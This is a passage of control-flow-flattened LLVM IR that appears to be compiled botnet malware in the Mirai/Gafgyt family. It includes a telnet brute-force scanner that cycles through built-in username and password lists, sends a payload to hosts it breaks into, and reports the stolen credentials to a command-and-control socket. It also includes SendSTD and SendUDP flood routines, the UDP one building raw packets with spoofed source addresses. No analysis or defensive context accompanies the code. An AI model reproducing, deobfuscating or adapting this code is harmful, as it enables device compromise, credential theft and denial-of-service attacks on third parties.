  %712 = call i32 (i32, i8*, ...) @sockprintf(i32 %691, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.118, i32 0, i32 0), i8* %695, i8* %703, i8* %711)
  %713 = load i32, i32* %6, align 4
  %714 = sext i32 %713 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %714
  call void @advance_telstate(%struct.telstate_t* %715, i32 8)
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:716:                                    ; preds = %loopEntry
  %717 = call i64 @time(i64* null) #5
  %718 = trunc i64 %717 to i32
  %719 = load i32, i32* %6, align 4
  %720 = sext i32 %719 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 7
  store i32 %718, i32* %722, align 16
  %723 = load i32, i32* %6, align 4
  %724 = sext i32 %723 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 16
  %728 = call i64 @send(i32 %727, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0), i64 4, i32 16384)
  %729 = icmp slt i64 %728, 0
  %730 = select i1 %729, i32 1251249258, i32 -1415658563
  store i32 %730, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  store i32 -1415658563, i32* %switchVar
  br label %loopEnd

; <label>:732:                                    ; preds = %loopEntry
  %733 = load i32, i32* %6, align 4
  %734 = sext i32 %733 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 0
  %737 = load i32, i32* %736, align 16
  %738 = call i64 @send(i32 %737, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.120, i32 0, i32 0), i64 7, i32 16384)
  %739 = icmp slt i64 %738, 0
  %740 = select i1 %739, i32 -529507423, i32 2033864341
  store i32 %740, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  store i32 2033864341, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  %743 = load i32, i32* %6, align 4
  %744 = sext i32 %743 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %744
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %745, i32 0, i32 0
  %747 = load i32, i32* %746, align 16
  %748 = load i8*, i8** @payload, align 8
  %749 = load i8*, i8** @payload, align 8
  %750 = call i64 @strlen(i8* %749) #9
  %751 = call i64 @send(i32 %747, i8* %748, i64 %750, i32 16384)
  %752 = icmp slt i64 %751, 0
  %753 = select i1 %752, i32 188604199, i32 496785658
  store i32 %753, i32* %switchVar
  br label %loopEnd

; <label>:754:                                    ; preds = %loopEntry
  %755 = load i32, i32* %6, align 4
  %756 = sext i32 %755 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %756
  call void @reset_telstate(%struct.telstate_t* %757)
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:758:                                    ; preds = %loopEntry
  %759 = load i32, i32* @mainCommSock, align 4
  %760 = load i32, i32* %6, align 4
  %761 = sext i32 %760 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %761
  %763 = call i8* @get_telstate_host(%struct.telstate_t* %762)
  %764 = load i32, i32* %6, align 4
  %765 = sext i32 %764 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 4
  %768 = load i8, i8* %767, align 2
  %769 = zext i8 %768 to i64
  %770 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %769
  %771 = load i8*, i8** %770, align 8
  %772 = load i32, i32* %6, align 4
  %773 = sext i32 %772 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 5
  %776 = load i8, i8* %775, align 1
  %777 = zext i8 %776 to i64
  %778 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %777
  %779 = load i8*, i8** %778, align 8
  %780 = call i32 (i32, i8*, ...) @sockprintf(i32 %759, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.121, i32 0, i32 0), i8* %763, i8* %771, i8* %779)
  %781 = load i32, i32* %6, align 4
  %782 = sext i32 %781 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 0
  %785 = load i32, i32* %784, align 16
  %786 = load i32, i32* %3, align 4
  %787 = load i32, i32* %6, align 4
  %788 = sext i32 %787 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 9
  %791 = load i8*, i8** %790, align 8
  %792 = call i32 @read_until_response(i32 %785, i32 %786, i8* %791, i32 1024, i8** bitcast ([10 x i8]* @.str.122 to i8**))
  %793 = icmp ne i32 %792, 0
  %794 = select i1 %793, i32 166057842, i32 680209231
  store i32 %794, i32* %switchVar
  br label %loopEnd

; <label>:795:                                    ; preds = %loopEntry
  %796 = load i32, i32* %6, align 4
  %797 = sext i32 %796 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %797
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %798, i32 0, i32 9
  %800 = load i8*, i8** %799, align 8
  %801 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %800, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.123, i32 0, i32 0))
  %802 = icmp ne i32 %801, 0
  %803 = select i1 %802, i32 1361816481, i32 1085536906
  store i32 %803, i32* %switchVar
  br label %loopEnd

; <label>:804:                                    ; preds = %loopEntry
  %805 = load i32, i32* %6, align 4
  %806 = sext i32 %805 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 3
  %809 = load i8, i8* %808, align 1
  %810 = zext i8 %809 to i32
  %811 = icmp ne i32 %810, 3
  %812 = select i1 %811, i32 1801551607, i32 1085536906
  store i32 %812, i32* %switchVar
  br label %loopEnd

; <label>:813:                                    ; preds = %loopEntry
  %814 = load i32, i32* @mainCommSock, align 4
  %815 = load i32, i32* %6, align 4
  %816 = sext i32 %815 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %816
  %818 = call i8* @get_telstate_host(%struct.telstate_t* %817)
  %819 = load i32, i32* %6, align 4
  %820 = sext i32 %819 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 4
  %823 = load i8, i8* %822, align 2
  %824 = zext i8 %823 to i64
  %825 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %824
  %826 = load i8*, i8** %825, align 8
  %827 = load i32, i32* %6, align 4
  %828 = sext i32 %827 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 5
  %831 = load i8, i8* %830, align 1
  %832 = zext i8 %831 to i64
  %833 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %832
  %834 = load i8*, i8** %833, align 8
  %835 = call i32 (i32, i8*, ...) @sockprintf(i32 %814, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.124, i32 0, i32 0), i8* %818, i8* %826, i8* %834)
  store i32 1085536906, i32* %switchVar
  br label %loopEnd

; <label>:836:                                    ; preds = %loopEntry
  store i32 680209231, i32* %switchVar
  br label %loopEnd

; <label>:837:                                    ; preds = %loopEntry
  %838 = load i32, i32* %6, align 4
  %839 = sext i32 %838 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 7
  %842 = load i32, i32* %841, align 16
  %843 = add i32 %842, 45
  %844 = zext i32 %843 to i64
  %845 = call i64 @time(i64* null) #5
  %846 = icmp slt i64 %844, %845
  %847 = select i1 %846, i32 1012513420, i32 1421059343
  store i32 %847, i32* %switchVar
  br label %loopEnd

; <label>:848:                                    ; preds = %loopEntry
  %849 = load i32, i32* %6, align 4
  %850 = sext i32 %849 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %850
  %852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %851, i32 0, i32 3
  %853 = load i8, i8* %852, align 1
  %854 = zext i8 %853 to i32
  %855 = icmp ne i32 %854, 3
  %856 = select i1 %855, i32 -2034511154, i32 -1056324750
  store i32 %856, i32* %switchVar
  br label %loopEnd

; <label>:857:                                    ; preds = %loopEntry
  %858 = load i32, i32* @mainCommSock, align 4
  %859 = load i32, i32* %6, align 4
  %860 = sext i32 %859 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %860
  %862 = call i8* @get_telstate_host(%struct.telstate_t* %861)
  %863 = load i32, i32* %6, align 4
  %864 = sext i32 %863 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 4
  %867 = load i8, i8* %866, align 2
  %868 = zext i8 %867 to i64
  %869 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %868
  %870 = load i8*, i8** %869, align 8
  %871 = load i32, i32* %6, align 4
  %872 = sext i32 %871 to i64
  %.reload22 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload22, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 5
  %875 = load i8, i8* %874, align 1
  %876 = zext i8 %875 to i64
  %877 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %876
  %878 = load i8*, i8** %877, align 8
  %879 = call i32 (i32, i8*, ...) @sockprintf(i32 %858, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.125, i32 0, i32 0), i8* %862, i8* %870, i8* %878)
  store i32 -1056324750, i32* %switchVar
  br label %loopEnd

; <label>:880:                                    ; preds = %loopEntry
  %881 = load i32, i32* %6, align 4
  %882 = sext i32 %881 to i64
  %.reload21 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload21, i64 %882
  call void @reset_telstate(%struct.telstate_t* %883)
  store i32 1421059343, i32* %switchVar
  br label %loopEnd

; <label>:884:                                    ; preds = %loopEntry
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:885:                                    ; preds = %loopEntry
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:886:                                    ; preds = %loopEntry
  %887 = load i32, i32* %6, align 4
  %888 = add nsw i32 %887, 1
  store i32 %888, i32* %6, align 4
  store i32 -1897612456, i32* %switchVar
  br label %loopEnd

; <label>:889:                                    ; preds = %loopEntry
  store i32 -784937600, i32* %switchVar
  br label %loopEnd

; <label>:890:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %889, %886, %885, %NewDefault, %884, %880, %857, %848, %837, %836, %813, %804, %795, %758, %754, %742, %741, %732, %731, %716, %689, %685, %671, %670, %666, %655, %654, %653, %649, %648, %622, %618, %609, %600, %596, %581, %566, %562, %558, %549, %545, %519, %518, %514, %503, %502, %498, %494, %479, %464, %460, %456, %447, %443, %417, %416, %412, %401, %400, %396, %392, %377, %362, %361, %357, %346, %345, %341, %337, %336, %319, %315, %298, %264, %263, %254, %253, %252, %248, %244, %239, %216, %215, %190, %189, %188, %183, %174, %169, %148, %139, %119, %110, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %93, %86, %78, %73, %72, %71, %70, %67, %53, %48, %32, %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @RemoveTempDirs(...) #1

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [26 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 -2039505149, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2039505149, label %38
    i32 -329558092, label %48
    i32 170516293, label %62
    i32 680687159, label %65
    i32 1485388759, label %66
    i32 939930741, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 26
  %43 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  %47 = select i1 %46, i32 -329558092, i32 1485388759
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 75, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i64 @time(i64* null) #5
  %56 = load i64, i64* %8, align 8
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = add nsw i64 %56, %58
  %60 = icmp sge i64 %55, %59
  %61 = select i1 %60, i32 170516293, i32 680687159
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #11
  unreachable

; <label>:65:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1485388759, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %11, align 4
  store i32 -2039505149, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %66, %65, %48, %38, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 935878314, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 935878314, label %first
    i32 -681972822, label %28
    i32 -594210363, label %32
    i32 -868434268, label %37
    i32 1580969375, label %43
    i32 92417011, label %44
    i32 -744488480, label %52
    i32 -434385912, label %53
    i32 1292053114, label %59
    i32 -1209481409, label %60
    i32 1329488268, label %61
    i32 507587767, label %66
    i32 1269638056, label %73
    i32 -1918444580, label %118
    i32 1053217353, label %120
    i32 1328672747, label %125
    i32 -1378711753, label %152
    i32 -128569588, label %153
    i32 1110595151, label %166
    i32 -394498398, label %168
    i32 -842210526, label %173
    i32 601638781, label %200
    i32 311710769, label %206
    i32 -517453973, label %207
    i32 1665105214, label %208
    i32 -191949610, label %211
    i32 -630738924, label %213
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 0
  %27 = select i1 %26, i32 -681972822, i32 -594210363
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  store i32 -868434268, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %8, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 -868434268, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %7, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 1580969375, i32 92417011
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -630738924, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = load i32, i32* %11, align 4
  store i32 %47, i32* %14, align 4
  %48 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %48, i32* %15, align 4
  %49 = load i32, i32* %15, align 4
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 -434385912, i32 -744488480
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 -630738924, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  %54 = load i32, i32* %15, align 4
  %55 = bitcast i32* %16 to i8*
  %56 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* %55, i32 4) #5
  %57 = icmp slt i32 %56, 0
  %58 = select i1 %57, i32 1292053114, i32 -1209481409
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -630738924, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 50, i32* %17, align 4
  store i32 1329488268, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %17, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %17, align 4
  %64 = icmp ne i32 %62, 0
  %65 = select i1 %64, i32 507587767, i32 1269638056
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = call i64 @time(i64* null) #5
  %68 = call i32 @rand_cmwc()
  %69 = zext i32 %68 to i64
  %70 = xor i64 %67, %69
  %71 = trunc i64 %70 to i32
  call void @srand(i32 %71) #5
  %72 = call i32 @rand() #5
  call void @init_rand(i32 %72)
  store i32 1329488268, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sub nsw i32 32, %74
  %76 = shl i32 1, %75
  %77 = sub nsw i32 %76, 1
  %78 = xor i32 %77, -1
  store i32 %78, i32* %18, align 4
  %79 = load i32, i32* %10, align 4
  %80 = sext i32 %79 to i64
  %81 = add i64 28, %80
  store i64 %81, i64* %.reg2mem2
  %82 = call i8* @llvm.stacksave()
  store i8* %82, i8** %19, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %83 = alloca i8, i64 %.reload4, align 16
  store i8* %83, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %84 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = bitcast %struct.iphdr* %85 to i8*
  %87 = getelementptr i8, i8* %86, i64 20
  %88 = bitcast i8* %87 to %struct.udphdr*
  store %struct.udphdr* %88, %struct.udphdr** %21, align 8
  %89 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = load i32, i32* %18, align 4
  %94 = call i32 @getRandomIP(i32 %93)
  %95 = call i32 @htonl(i32 %94) #10
  %96 = load i32, i32* %10, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 8, %97
  %99 = trunc i64 %98 to i32
  call void @makeIPPacket(%struct.iphdr* %89, i32 %92, i32 %95, i8 zeroext 17, i32 %99)
  %100 = load i32, i32* %10, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 8, %101
  %103 = trunc i64 %102 to i16
  %104 = call zeroext i16 @htons(i16 zeroext %103) #10
  %105 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %106 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.1* %106 to %struct.anon.2*
  %108 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %107, i32 0, i32 2
  store i16 %104, i16* %108, align 2
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %112 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %111, i32 0, i32 0
  %113 = bitcast %union.anon.1* %112 to %struct.anon.2*
  %114 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %113, i32 0, i32 0
  store i16 %110, i16* %114, align 2
  %115 = load i32, i32* %8, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -1918444580, i32 1053217353
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @rand_cmwc()
  store i32 1328672747, i32* %switchVar
  store i32 %119, i32* %.reg2mem10
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %8, align 4
  %122 = trunc i32 %121 to i16
  %123 = call zeroext i16 @htons(i16 zeroext %122) #10
  %124 = zext i16 %123 to i32
  store i32 1328672747, i32* %switchVar
  store i32 %124, i32* %.reg2mem10
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %126 = trunc i32 %.reload11 to i16
  %127 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.1* %128 to %struct.anon.2*
  %130 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %129, i32 0, i32 1
  store i16 %126, i16* %130, align 2
  %131 = load %struct.udphdr*, %struct.udphdr** %21, align 8
